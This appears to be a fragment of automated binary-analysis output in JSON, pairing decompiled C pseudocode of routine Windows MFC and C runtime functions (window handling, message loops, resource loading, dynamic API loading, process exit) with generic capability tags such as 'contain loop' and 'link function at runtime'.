        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041a620)\n// WARNING: Removing unreachable block (ram,0x0041a622)\n// WARNING: Removing unreachable block (ram,0x0041a63e)\n// WARNING: Removing unreachable block (ram,0x0041a647)\n// WARNING: Removing unreachable block (ram,0x0041a64c)\n// WARNING: Removing unreachable block (ram,0x0041a658)\n// WARNING: Removing unreachable block (ram,0x0041a65c)\n// WARNING: Removing unreachable block (ram,0x0041a660)\n// WARNING: Removing unreachable block (ram,0x0041a664)\n// WARNING: Removing unreachable block (ram,0x0041a670)\n// WARNING: Removing unreachable block (ram,0x0041a629)\n// WARNING: Removing unreachable block (ram,0x0041a63c)\n\nvoid fcn.0041a601(int32_t param_1)\n\n{\n    if (param_1 != 0) {\n        (*_sym.imp.USER32.dll_IsWindow)(*(param_1 + 0x1c));\n    }\n    return;\n}\n",
        "token_count": 252
    },
    "0041a67c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0041a67c(int32_t param_1, int32_t param_2)\n\n{\n    int32_t noname_5;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t noname_1;\n    uint unaff_EBX;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    int32_t noname_4;\n    uint noname_6;\n    int32_t noname_4_00;\n    \n    noname_4_00 = param_2;\n    noname_5 = fcn.0042cda5();\n    if (noname_5 == 0) {\n        noname_6 = 1;\n        noname_4 = param_1;\n        iVar1 = fcn.0041a281(param_1, 0, 1, unaff_EBX, noname_4_00, unaff_EDI, unaff_retaddr, param_1, param_2);\n        noname_1 = iVar1;\n        if (iVar1 == param_1) {\n            noname_5 = 0;\n        }\n        else {\n            do {\n                iVar2 = fcn.0042cec9();\n                if (iVar2 == noname_4_00) {\n                    return noname_1;\n                }\n                noname_1 = fcn.0041a281(param_1, noname_1, 1, param_1, noname_4, noname_5, noname_6, unaff_EBX, \n                                        noname_4_00);\n            } while ((noname_1 != 0) && (noname_1 != iVar1));\n            noname_5 = 0;\n        }\n    }\n    return noname_5;\n}\n",
        "token_count": 390
    },
    "0041a720": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041a720(uint param_1, int32_t param_2, uint param_3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t noname_1;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    uint noname_4;\n    int32_t noname_5;\n    \n    if (param_2 != 0) {\n        noname_4 = *(param_2 + 0x1c);\n        uVar1 = (*_sym.imp.USER32.dll_GetWindowLongA)(noname_4, 0xffffffec);\n        if ((uVar1 & 0x10000) == 0) {\n            iVar2 = fcn.0041a22c();\n            noname_5 = param_2;\n            goto code_r0x0041a755;\n        }\n    }\n    noname_5 = 3;\n    noname_4 = 0;\n    iVar2 = fcn.0041a281(param_1, 0, 3, unaff_EDI, unaff_ESI, unaff_retaddr, param_1, param_2, param_3);\ncode_r0x0041a755:\n    noname_1 = iVar2;\n    if (iVar2 != 0) {\n        do {\n            fcn.0041a6d3(noname_1, 0);\n            noname_1 = fcn.0041a281(unaff_EDI, noname_1, 0, unaff_EDI, noname_4, noname_5, unaff_EDI, unaff_ESI, \n                                    unaff_retaddr);\n            if (noname_1 == 0) {\n                return;\n            }\n        } while (noname_1 != iVar2);\n    }\n    return;\n}\n",
        "token_count": 408
    },
    "0041aec1": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041aec1(void)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    \n    iVar2 = fcn.00431a51();\n    puVar3 = 0xb;\n    fcn.00432c08(0xb);\n    while (puVar1 = *(iVar2 + 0x103c),  puVar1 != NULL) {\n        puVar3 = puVar1;\n        fcn.0043269d();\n        if (puVar1 != NULL) {\n            (***puVar1)(1);\n        }\n    }\n    fcn.00432c6b(0xb, puVar3);\n    return;\n}\n",
        "token_count": 154
    },
    "0041b742": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0041b742(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    iVar1 = fcn.0041e005();\n    piVar2 = *(iVar1 + 0x88);\n    while( true ) {\n        if (piVar2 == NULL) {\n            return 1;\n        }\n        if (*piVar2 == param_1) break;\n        piVar2 = piVar2[1];\n    }\n    return 0;\n}\n",
        "token_count": 115
    },
    "0041b8f6": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041b8f6(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t unaff_EBP;\n    uint var_4h;\n    \n    fcn.0041cd84(0x43ad48, 0x14);\n    *(unaff_EBP + -4) = 0;\n    while( true ) {\n        piVar1 = unaff_EBP + 0x10;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 < 0) break;\n        *(unaff_EBP + 8) = *(unaff_EBP + 8) - *(unaff_EBP + 0xc);\n        (**(unaff_EBP + 0x14))();\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0041cdbf();\n    return;\n}\n",
        "token_count": 234
    },
    "0041bd0d": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint16_t * fcn.0041bd0d(int16_t *param_1, int16_t *param_2)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    \n    piVar2 = param_1;\n    do {\n        iVar1 = *param_2;\n        *piVar2 = iVar1;\n        piVar2 = piVar2 + 1;\n        param_2 = param_2 + 1;\n    } while (iVar1 != 0);\n    return param_1;\n}\n",
        "token_count": 118
    },
    "0041da46": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041da46(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = fcn.0041e005();\n    *(iVar1 + 0xc) = param_1;\n    uVar2 = 0;\n    do {\n        if (param_1 == *(uVar2 * 8 + 0x444348)) {\n            iVar1 = fcn.0041e005();\n            *(iVar1 + 8) = *(uVar2 * 8 + 0x44434c);\n            return;\n        }\n        uVar2 = uVar2 + 1;\n    } while (uVar2 < 0x2d);\n    if ((0x12 < param_1) && (param_1 < 0x25)) {\n        iVar1 = fcn.0041e005();\n        *(iVar1 + 8) = 0xd;\n        return;\n    }\n    if ((0xbb < param_1) && (param_1 < 0xcb)) {\n        iVar1 = fcn.0041e005();\n        *(iVar1 + 8) = 8;\n        return;\n    }\n    iVar1 = fcn.0041e005();\n    *(iVar1 + 8) = 0x16;\n    return;\n}\n",
        "token_count": 292
    },
    "00427b41": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00427b41(int32_t param_1, int32_t param_2, uint *param_3)\n\n{\n    if (param_3 != NULL) goto code_r0x00427b57;\n    for (param_3 = *(param_1 + 4); (param_3 != NULL && (param_3[2] != param_2)); param_3 = *param_3) {\ncode_r0x00427b57:\n    }\n    return;\n}\n",
        "token_count": 111
    },
    "00427e86": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00427e86(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    \n    if (param_1 != NULL) {\n        do {\n            piVar1 = *param_1;\n            fcn.00428fdc(param_1);\n            param_1 = piVar1;\n        } while (piVar1 != NULL);\n    }\n    return;\n}\n",
        "token_count": 89
    },
    "00427f2c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.00427f2c(int32_t param_1, uint32_t param_2, uint32_t *param_3, uint32_t *param_4)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    \n    *param_4 = param_2 >> 4;\n    uVar2 = (param_2 >> 4) % *(param_1 + 8);\n    *param_3 = uVar2;\n    if (*(param_1 + 4) != 0) {\n        for (puVar1 = *(*(param_1 + 4) + uVar2 * 4); puVar1 != NULL; puVar1 = *puVar1) {\n            if (puVar1[1] == param_2) {\n                return puVar1;\n            }\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 193
    },
    "00427f64": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __thiscall fcn.00427f64(int32_t param_1, uint32_t param_2)\n\n{\n    uint *puVar1;\n    \n    if (*(param_1 + 4) != 0) {\n        for (puVar1 = *(*(param_1 + 4) + ((param_2 >> 4) % *(param_1 + 8)) * 4); puVar1 != NULL; puVar1 = *puVar1) {\n            if (puVar1[1] == param_2) {\n                return puVar1[2];\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 139
    },
    "00427f9b": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.00427f9b(int32_t param_1, uint32_t param_2)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    uint *puVar3;\n    \n    if (*(param_1 + 4) == 0) {\n        puVar2 = NULL;\n    }\n    else {\n        puVar3 = *(param_1 + 4) + ((param_2 >> 4) % *(param_1 + 8)) * 4;\n        puVar1 = *puVar3;\n        while (puVar2 = puVar1,  puVar2 != NULL) {\n            if (puVar2[1] == param_2) {\n                *puVar3 = *puVar2;\n                fcn.00427f13(puVar2);\n                return 0x1;\n            }\n            puVar3 = puVar2;\n            puVar1 = *puVar2;\n        }\n    }\n    return puVar2;\n}\n",
        "token_count": 220
    },
    "00428fb1": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00428fb1(uint param_1)\n\n{\n    int32_t iVar1;\n    \n    while( true ) {\n        iVar1 = fcn.0041ba5b(param_1);\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n        if (*0x443468 == NULL) break;\n        iVar1 = (**0x443468)(param_1);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 115
    },
    "00428fe1": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00428fe1(uint param_1)\n\n{\n    int32_t iVar1;\n    \n    while( true ) {\n        iVar1 = fcn.0041ba5b(param_1);\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n        if (*0x443468 == NULL) break;\n        iVar1 = (**0x443468)(param_1);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 115
    },
    "0042a62a": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0042a62a(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint unaff_retaddr;\n    \n    iVar1 = (*_sym.imp.USER32.dll_GetMenuItemCount)(*(param_1 + 4));\n    iVar3 = 0;\n    if (0 < iVar1) {\n        do {\n            iVar2 = fcn.00412ee8(iVar3);\n            if (iVar2 == 0) {\n                iVar2 = (*_sym.imp.USER32.dll_GetMenuItemID)(*(param_1 + 4), iVar3);\n                if (iVar2 == param_1) {\n                    iVar1 = fcn.0042e4ae(*(param_1 + 4));\n                    return iVar1;\n                }\n            }\n            else {\n                iVar2 = fcn.0042a62a(iVar2, unaff_retaddr);\n                if (iVar2 != 0) {\n                    return iVar2;\n                }\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < iVar1);\n    }\n    return 0;\n}\n",
        "token_count": 253
    },
    "0042b1a1": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042b1a1(uint hDlg, uint nIDDlgItem, int32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (*_sym.imp.USER32.dll_GetDlgItem)(hDlg, nIDDlgItem);\n    pcVar1 = _sym.imp.USER32.dll_GetTopWindow;\n    if (iVar2 != 0) {\n        iVar3 = (*_sym.imp.USER32.dll_GetTopWindow)(iVar2);\n        if ((iVar3 != 0) && (iVar3 = fcn.0042b1a1(iVar2, nIDDlgItem, arg_10h),  iVar3 != 0)) {\n            return;\n        }\n        if (arg_10h == 0) {\n            fcn.0042aeb1();\n            return;\n        }\n        iVar2 = fcn.0042aed8(iVar2);\n        if (iVar2 != 0) {\n            return;\n        }\n    }\n    iVar2 = (*pcVar1)(hDlg);\n    while( true ) {\n        if (iVar2 == 0) {\n            return;\n        }\n        iVar3 = fcn.0042b1a1(iVar2, nIDDlgItem, arg_10h);\n        if (iVar3 != 0) break;\n        iVar2 = (*_sym.imp.USER32.dll_GetWindow)(iVar2, 2);\n    }\n    return;\n}\n",
        "token_count": 325
    },
    "0042b218": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0042b218(uint param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_retaddr;\n    \n    iVar3 = *param_2;\n    while( true ) {\n        if (iVar3 == 0) {\n            return 0;\n        }\n        piVar1 = fcn.0042aed8(iVar3);\n        if ((piVar1 != NULL) && (iVar2 = (**(*piVar1 + 0x100))(param_2),  iVar2 != 0)) break;\n        if (iVar3 == unaff_retaddr) {\n            return 0;\n        }\n        iVar3 = (*_sym.imp.USER32.dll_GetParent)(iVar3);\n    }\n    return 1;\n}\n",
        "token_count": 186
    },
    "0042b36f": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0042b36f(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint var_1ch;\n    \n    pcVar1 = _sym.imp.USER32.dll_PeekMessageA;\n    while( true ) {\n        iVar2 = (*pcVar1)(&var_1ch, 0, 0x121, 0x121, 1);\n        if (iVar2 == 0) break;\n        (*_sym.imp.USER32.dll_DispatchMessageA)(&var_1ch);\n    }\n    fcn.0042ae0e();\n    return;\n}\n",
        "token_count": 135
    },
    "0042b6cd": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0042b6cd(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetParent;\n    if ((param_1 != 0) && (iVar2 = *(param_1 + 0x1c),  iVar2 != 0)) {\n        while( true ) {\n            uVar3 = (*pcVar1)(iVar2);\n            piVar4 = fcn.0042aeb1(uVar3);\n            if ((piVar4 == NULL) || (iVar2 = (**(*piVar4 + 0x120))(),  iVar2 != 0)) break;\n            iVar2 = piVar4[7];\n        }\n        return piVar4;\n    }\n    return NULL;\n}\n",
        "token_count": 197
    },
    "0042bb73": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0042bb73(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if ((param_1 != 0) && (iVar1 = *(param_1 + 0x1c),  *(param_1 + 0x1c) != 0)) {\n        do {\n            iVar3 = iVar1;\n            iVar1 = fcn.0042bb2e(iVar3);\n        } while (iVar1 != 0);\n        uVar2 = fcn.0042aeb1(iVar3);\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 150
    },
    "0042fce6": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0042fce6(int32_t hWnd, uint lpPoint, uint arg_10h)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint lpRect;\n    \n    (*_sym.imp.USER32.dll_ClientToScreen)(hWnd, &lpPoint);\n    pcVar1 = _sym.imp.USER32.dll_GetWindow;\n    uVar5 = 5;\n    do {\n        hWnd = (*pcVar1)(hWnd, uVar5);\n        if (hWnd == 0) {\n            return 0;\n        }\n        iVar2 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(hWnd);\n        if ((iVar2 != 0) &&\n           (uVar3 = (*_sym.imp.USER32.dll_GetWindowLongA)(hWnd, 0xfffffff0),  (uVar3 & 0x10000000) != 0)) {\n            (*_sym.imp.USER32.dll_GetWindowRect)(hWnd, &lpRect);\n            iVar4 = (*_sym.imp.USER32.dll_PtInRect)(&lpRect, lpPoint, arg_10h);\n            if (iVar4 != 0) {\n                return hWnd;\n            }\n        }\n        uVar5 = 2;\n    } while( true );\n}\n",
        "token_count": 300
    },
    "0042febc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0042febc(int32_t param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    \n    pcVar2 = _sym.imp.USER32.dll_GetParent;\n    iVar3 = param_1;\n    if (param_1 != 0) goto code_r0x0042feeb;\n    iVar3 = fcn.0042fe83();\n    if ((iVar3 == 0) && (iVar3 = fcn.00411a01(),  iVar3 == 0)) {\n        iVar3 = 0;\n        iVar5 = iVar3;\n        iVar6 = iVar3;\n    }\n    else {\n        for (iVar3 = *(iVar3 + 0x1c); iVar5 = iVar3,  iVar6 = iVar3,  iVar3 != 0; iVar3 = (*pcVar2)(iVar3)) {\ncode_r0x0042feeb:\n            uVar4 = (*_sym.imp.USER32.dll_GetWindowLongA)(iVar3, 0xfffffff0);\n            iVar5 = iVar3;\n            iVar6 = iVar3;\n            if ((uVar4 & 0x40000000) == 0) break;\n        }\n    }\n    while (iVar1 = iVar5,  iVar1 != 0) {\n        iVar5 = (*pcVar2)(iVar1);\n        iVar3 = iVar1;\n    }\n    if ((param_1 == 0) && (iVar6 != 0)) {\n        iVar6 = (*_sym.imp.USER32.dll_GetLastActivePopup)(iVar6);\n    }\n    if (param_2 != NULL) {\n        if (((iVar3 == 0) || (iVar5 = (*_sym.imp.USER32.dll_IsWindowEnabled)(iVar3),  iVar5 == 0)) || (iVar3 == iVar6))\n        {\n            *param_2 = 0;\n        }\n        else {\n            *param_2 = iVar3;\n            (*_sym.imp.USER32.dll_EnableWindow)(iVar3, 0);\n        }\n    }\n    return iVar6;\n}\n",
        "token_count": 485
    },
    "0043269d": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0043269d(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    \n    iVar4 = *param_1;\n    uVar3 = 0;\n    if (iVar4 != 0) {\n        if (iVar4 == param_2) {\n            *param_1 = *(param_2 + param_1[1]);\n        }\n        else {\n            iVar1 = param_1[1];\n            do {\n                iVar2 = *(iVar1 + iVar4);\n                if (iVar2 == param_2) break;\n                iVar4 = iVar2;\n            } while (iVar2 != 0);\n            if (iVar4 == 0) {\n                return 0;\n            }\n            *(iVar1 + iVar4) = *(iVar1 + param_2);\n        }\n        uVar3 = 1;\n    }\n    return uVar3;\n}\n",
        "token_count": 222
    },
    "00432726": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00432726(int32_t arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint *puVar2;\n    int32_t in_ECX;\n    int32_t iVar3;\n    uint lpCriticalSection;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(in_ECX + 0x1c);\n    if ((0 < arg_8h) && (arg_8h < *(in_ECX + 0xc))) {\n        for (iVar3 = *(in_ECX + 0x14); iVar3 != 0; iVar3 = *(iVar3 + 4)) {\n            if (arg_8h < *(iVar3 + 8)) {\n                puVar2 = *(*(iVar3 + 0xc) + arg_8h * 4);\n                if (puVar2 != NULL) {\n                    (***puVar2)(1);\n                }\n                *(*(iVar3 + 0xc) + arg_8h * 4) = 0;\n            }\n        }\n        puVar1 = *(in_ECX + 0x10) + arg_8h * 8;\n        *puVar1 = *puVar1 & 0xfffffffe;\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(in_ECX + 0x1c);\n    }\n    return;\n}\n",
        "token_count": 294
    },
    "00434b91": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00434b91(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00431a51();\n    fcn.00432c08(0);\n    for (iVar1 = *(iVar1 + 0x24); iVar1 != 0; iVar1 = *(iVar1 + 0x1c)) {\n        fcn.00434b70();\n    }\n    fcn.00432c6b(0);\n    return;\n}\n",
        "token_count": 105
    },
    "00429905": {
        "rules": [
            "extract resource via kernel32 functions"
        ],
        "decompiled_code": "\nvoid fcn.00429905(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_LockResource)(param_1);\n    fcn.004298da(uVar1, param_1, 0, param_2);\n    return;\n}\n",
        "token_count": 73
    },
    "0042cb10": {
        "rules": [
            "extract resource via kernel32 functions"
        ],
        "decompiled_code": "\nuint fcn.0042cb10(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t arg_8h;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    arg_8h = 0;\n    if (param_1 != 0) {\n        iVar1 = fcn.00431a51();\n        uVar2 = *(iVar1 + 0xc);\n        iVar1 = (*_sym.imp.KERNEL32.dll_FindResourceA)(uVar2, param_1, 0xf0);\n        if (iVar1 != 0) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_LoadResource)(uVar2, iVar1);\n            if (iVar3 == 0) {\n                return 0;\n            }\n            arg_8h = (*_sym.imp.KERNEL32.dll_LockResource)(iVar3);\n        }\n    }\n    uVar2 = fcn.0042bc75(arg_8h);\n    if ((arg_8h != 0) && (iVar3 != 0)) {\n        (*_sym.imp.KERNEL32.dll_FreeResource)(iVar3);\n    }\n    return uVar2;\n}\n",
        "token_count": 263
    },
    "0041265b": {
        "rules": [
            "link function at runtime on Windows",
            "link many functions at runtime"
        ],
        "decompiled_code": "\nbool fcn.0041265b(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    if (*0x449094 != 0) {\n        return *0x449088 != 0;\n    }\n    *0x449098 = fcn.0041260e();\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"USER32\");\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (((((iVar2 != 0) && (*0x449078 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x4391a4),  *0x449078 != 0)) &&\n         (*0x44907c = (*pcVar1)(iVar2, \"MonitorFromWindow\"),  *0x44907c != 0)) &&\n        ((*0x449080 = (*pcVar1)(iVar2, \"MonitorFromRect\"),  *0x449080 != 0 &&\n         (*0x449084 = (*pcVar1)(iVar2, \"MonitorFromPoint\"),  *0x449084 != 0)))) &&\n       ((*0x44908c = (*pcVar1)(iVar2, \"EnumDisplayMonitors\"),  *0x44908c != 0 &&\n        ((*0x449088 = (*pcVar1)(iVar2, \"GetMonitorInfoA\"),  *0x449088 != 0 &&\n         (*0x449090 = (*pcVar1)(iVar2, \"EnumDisplayDevicesA\"),  *0x449090 != 0)))))) {\n        *0x449094 = 1;\n        return true;\n    }\n    *0x449078 = 0;\n    *0x44907c = 0;\n    *0x449080 = 0;\n    *0x449084 = 0;\n    *0x449088 = 0;\n    *0x44908c = 0;\n    *0x449090 = 0;\n    *0x449094 = 1;\n    return false;\n}\n",
        "token_count": 446
    },
    "0041ca64": {
        "rules": [
            "link function at runtime on Windows",
            "terminate process"
        ],
        "decompiled_code": "\nvoid fcn.0041ca64(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint unaff_retaddr;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"mscoree.dll\");\n    if (iVar1 != 0) {\n        pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"CorExitProcess\");\n        if (pcVar2 != NULL) {\n            (*pcVar2)(unaff_retaddr);\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(unaff_retaddr);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 153
    },
    "0042a427": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nuint32_t fcn.0042a427(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint32_t unaff_ESI;\n    uint32_t uVar5;\n    uint unaff_EDI;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"COMCTL32.DLL\");\n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"COMCTL32.DLL\");\n    uVar5 = uVar2;\n    if (uVar2 != 0) {\n        pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2, 0x439588);\n        uVar5 = 0;\n        if (pcVar3 == NULL) {\n            if ((unaff_ESI & 0x3fc0) == unaff_ESI) {\n                (*_sym.imp.COMCTL32.dll_InitCommonControls)();\n                uVar5 = 0x3fc0;\n            }\n        }\n        else {\n            iVar4 = (*pcVar3)(unaff_EDI);\n            if ((iVar4 != 0) && (uVar5 = unaff_ESI,  iVar1 == 0)) {\n                (*_sym.imp.COMCTL32.dll_InitCommonControls)();\n                uVar5 = unaff_ESI | 0x3fc0;\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_FreeLibrary)(uVar2);\n    }\n    return uVar5;\n}\n",
        "token_count": 333
    },
    "00423a40": {
        "rules": [
            "get geographical location"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00423a40(uint Locale)\n\n{\n    int32_t iVar1;\n    uint lpLCData;\n    uchar var_6h;\n    uint var_4h;\n    \n    var_4h = *0x444220;\n    var_6h = 0;\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoA)(Locale, 0x1004, &lpLCData, 6);\n    if (iVar1 != 0) {\n        fcn.0041d5fb(&lpLCData);\n    }\n    fcn.0041c6de();\n    return;\n}\n",
        "token_count": 137
    },
    "004317d7": {
        "rules": [
            "set application hook"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004317d7(code **param_1)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = _sym.imp.USER32.dll_UnhookWindowsHookEx;\n    *param_1 = vtable._AFX_THREAD_STATE.0;\n    if (param_1[0xb] != NULL) {\n        (*pcVar1)(param_1[0xb]);\n    }\n    if (param_1[10] != NULL) {\n        (*pcVar1)(param_1[10]);\n    }\n    if (param_1[3] != NULL) {\n        fcn.0041ba6d(param_1[3]);\n    }\n    return;\n}\n",
        "token_count": 148
    },
    "004325a9": {
        "rules": [
            "get thread local storage value"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004325a9(uint *param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t unaff_retaddr;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(param_1 + 7);\n    if ((0 < unaff_retaddr) && (unaff_retaddr < param_1[3])) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(*param_1);\n        if ((iVar1 != 0) && (unaff_retaddr < *(iVar1 + 8))) {\n            uVar2 = *(*(iVar1 + 0xc) + unaff_retaddr * 4);\n            goto code_r0x004325e0;\n        }\n    }\n    uVar2 = 0;\ncode_r0x004325e0:\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(param_1 + 7);\n    return uVar2;\n}\n",
        "token_count": 210
    }
}